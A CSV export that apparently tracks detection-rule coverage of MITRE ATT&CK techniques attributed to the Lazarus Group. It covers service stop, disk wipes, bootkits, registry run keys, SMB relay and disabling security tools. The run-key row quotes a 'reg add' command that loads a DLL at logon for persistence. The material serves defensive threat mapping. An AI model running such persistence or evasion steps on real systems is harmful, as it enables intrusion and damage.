Technique ID,Name,Tactics,Status,Linked Rule,Liczba wykryć,Author,Description,MITRE Link,ChangeHistory
T1489,Service Stop,Impact,Pending,alerts\Lazarus_Group\T1489_Service_Stop.html,,APT Matrix Generator,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster)   Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",https://attack.mitre.org/techniques/T1489/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1491.001,Internal Defacement,Impact,Pending,alerts\Lazarus_Group\T1491.001_Internal_Defacement.html,,APT Matrix Generator,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1491/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1529,System Shutdown/Reboot,Impact,Pending,alerts\Lazarus_Group\T1529_System_ShutdownReboot.html,,APT Matrix Generator,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.  Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.  Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",https://attack.mitre.org/techniques/T1529/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1542.003,Bootkit,"Defense-Evasion, Persistence",Pending,alerts\Lazarus_Group\T1542.003_Bootkit.html,,APT Matrix Generator,"Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.  In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)  The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.  In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",https://attack.mitre.org/techniques/T1542/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1543.003,Windows Service,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1543.003_Windows_Service.html,,APT Matrix Generator,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.  Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.   Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)  Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).  To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",https://attack.mitre.org/techniques/T1543/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1547.001,Registry Run Keys / Startup Folder,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1547.001_Registry_Run_Keys__Startup_Folder.html,,APT Matrix Generator,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.  The following run keys are created by default on Windows systems:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)  Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.  The following Registry keys can be used to set startup folder items for persistence:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>  The following Registry keys can control automatic startup of services during boot:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>  Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>  Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.  By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.  Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1547.009,Shortcut Modification,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1547.009_Shortcut_Modification.html,,APT Matrix Generator,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.  Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.  Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",https://attack.mitre.org/techniques/T1547/009/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1553.002,Code Signing,Defense-Evasion,Pending,alerts\Lazarus_Group\T1553.002_Code_Signing.html,,APT Matrix Generator,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.  Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)  Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",https://attack.mitre.org/techniques/T1553/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1557.001,LLMNR/NBT-NS Poisoning and SMB Relay,"Collection, Credential-Access",Pending,alerts\Lazarus_Group\T1557.001_LLMNRNBT-NS_Poisoning_and_SMB_Relay.html,,APT Matrix Generator,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.   Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)  Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.  In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.   Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",https://attack.mitre.org/techniques/T1557/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1560,Archive Collected Data,Collection,Pending,alerts\Lazarus_Group\T1560_Archive_Collected_Data.html,,APT Matrix Generator,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.  Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",https://attack.mitre.org/techniques/T1560/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1560.002,Archive via Library,Collection,Pending,alerts\Lazarus_Group\T1560.002_Archive_via_Library.html,,APT Matrix Generator,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.  Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",https://attack.mitre.org/techniques/T1560/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1560.003,Archive via Custom Method,Collection,Pending,alerts\Lazarus_Group\T1560.003_Archive_via_Custom_Method.html,,APT Matrix Generator,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",https://attack.mitre.org/techniques/T1560/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1561.001,Disk Content Wipe,Impact,Pending,alerts\Lazarus_Group\T1561.001_Disk_Content_Wipe.html,,APT Matrix Generator,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.  Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1561/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1561.002,Disk Structure Wipe,Impact,Pending,alerts\Lazarus_Group\T1561.002_Disk_Structure_Wipe.html,,APT Matrix Generator,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.   Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.  On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)  To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",https://attack.mitre.org/techniques/T1561/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1562.001,Disable or Modify Tools,Defense-Evasion,Pending,alerts\Lazarus_Group\T1562.001_Disable_or_Modify_Tools.html,,APT Matrix Generator,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)  Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)  Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging)   On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)  In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.  Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)  Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",https://attack.mitre.org/techniques/T1562/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1562.004,Disable or Modify System Firewall,Defense-Evasion,Pending,alerts\Lazarus_Group\T1562.004_Disable_or_Modify_System_Firewall.html,,APT Matrix Generator,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.  Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)  Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.  In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",https://attack.mitre.org/techniques/T1562/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
